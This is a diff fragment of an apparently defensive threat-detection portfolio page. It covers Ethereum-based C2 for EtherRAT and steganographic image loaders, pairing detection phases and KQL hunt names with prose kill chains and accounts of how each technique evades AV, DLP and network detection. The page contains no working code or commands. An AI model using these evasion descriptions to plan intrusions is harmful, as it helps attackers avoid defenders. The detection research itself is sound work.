+            <strong>Why this defeats traditional C2 detection:</strong> No malicious domain. No suspicious IP. HTTPS to Infura.io (legitimate Ethereum infrastructure). The C2 infrastructure is the Ethereum blockchain itself.
+            <div class="malware-tags">
+              <span class="malware-tag tag-red">EtherRAT</span>
+              <span class="malware-tag tag-red">React2Shell</span>
+              <span class="malware-tag tag-blue">CVE-2025-55182</span>
+              <span class="malware-tag tag-gold">Novel — no vendor coverage</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:8px">
+        <a href="https://github.com/azdabat" class="core-rule-link" target="_blank">📎 VIEW FULL RULE SET ON GITHUB → React2Shell_EtherRAT</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- NOVEL: Stego -->
+  <div class="novel-card" id="nov-stego">
+    <div class="novel-header" onclick="toggleNovel('nov-stego')">
+      <div class="novel-badge">NOVEL RESEARCH #3</div>
+      <div class="novel-title">Steganographic Loader Ecosystem — Image-Based Payload Delivery</div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="novel-body">
+      <div class="two-col" style="margin-bottom:20px">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 DETECTION COVERAGE — Multi-Phase</div>
+          <div class="panel-text">
+            <strong>Phase 1 — Image Inspection:</strong> Stego-Image-Loader.kql — detects anomalous image file access patterns: image files opened by scripting engines (PowerShell, VBScript), image files loaded into executable memory regions, image files with anomalous entropy in LSB layers (statistical detection).<br><br>
+            <strong>Phase 2 — Memory Indicators:</strong> Stego_NET_In_Memory_Hunt.kql — .NET assembly loaded from memory region that originated from image file read operation. Shellcode execution following image file parse.<br><br>
+            <strong>Phase 3 — IR SOP:</strong> Full incident response procedure for stego-loader compromise — evidence collection, IOC extraction from image files, memory forensics procedure.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 FULL KILL CHAIN — Steganography as Evasion</div>
+          <div class="panel-text">
+            <strong>The technique:</strong> Malicious payload encoded in the least-significant bits (LSB) of a legitimate-looking image file (PNG/BMP). The image passes all AV/DLP inspection — it is a valid image with correct headers, displays normally, has no embedded PE signature.<br><br>
+            <strong>Delivery chain:</strong><br>
+            1. Phishing email/compromised site delivers image file (appears as banner/logo/attachment)<br>
+            2. Dropper script opens image, reads pixel data, extracts LSB-encoded payload<br>
+            3. Payload decoded to shellcode/PE — loaded directly into memory (never written to disk)<br>
+            4. Shellcode executes — delivers next stage RAT or beacon<br><br>
+            <strong>Why it evades:</strong> No malicious file ever exists on disk. Image passes all signature scanning. Network DLP sees a legitimate image download. The only detection surface is the anomalous behaviour of the script reading image pixel data and executing the result.
+            <div class="malware-tags">
+              <span class="malware-tag tag-red">Witchetty (Stegmap)</span>
+              <span class="malware-tag tag-red">ZLoader stego variant</span>
+              <span class="malware-tag tag-red">Duqu 2.0</span>
+              <span class="malware-tag tag-gold">APT34 (OilRig)</span>
+              <span class="malware-tag tag-gold">Turla</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:8px">
+        <a href="https://github.com/azdabat" class="core-rule-link" target="_blank">📎 VIEW FULL RULE SET ON GITHUB → Stego_Threat_Analysis_And_Hunter_Pack</a>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end tab-novel -->
+
+</div><!-- end main -->
+
+<footer class="site-footer">
+  ALA DABAT · MINIMUM TRUTH DETECTION FRAMEWORK · github.com/azdabat · ADVERSARY-INFORMED · COMPOSITE-FIRST · COUSIN TECHNIQUE COVERAGE
+  <br><br>
+  <span style="color:var(--red-primary)">RED TEAM CONTENT</span> — All attack methodology documented at CEH/OSCP/public disclosure level. All techniques are publicly documented in MITRE ATT&CK, academic literature, and professional certification curricula.
+</footer>
+
+<script>
+function switchTab(name) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => {
+    t.classList.remove('active-blue','active-red','active-gold');
+  });
+  document.getElementById('tab-' + name).classList.add('active');
+  const tabs = document.querySelectorAll('.nav-tab');
+  tabs.forEach(t => {
+    if (t.getAttribute('onclick') && t.getAttribute('onclick').includes("'" + name + "'")) {
+      if (name === 'novel') t.classList.add('active-gold');
+      else if (['defense','credential','c2','exfil','impact'].includes(name)) t.classList.add('active-red');
+      else t.classList.add('active-blue');
+    }
+  });
+}
+
+function toggleEco(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('open');
+}
+
+function toggleCousin(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('open');
+}
+
+function toggleNovel(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('open');
+}
+
+// Open first ecosystem in each tab by default
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('.ecosystem').forEach((eco, i) => {
+    if (i === 0) eco.classList.add('open');
+  });
+  document.querySelectorAll('.novel-card').forEach(n => n.classList.add('open'));
+});
+</script>
+</body>
+</html>
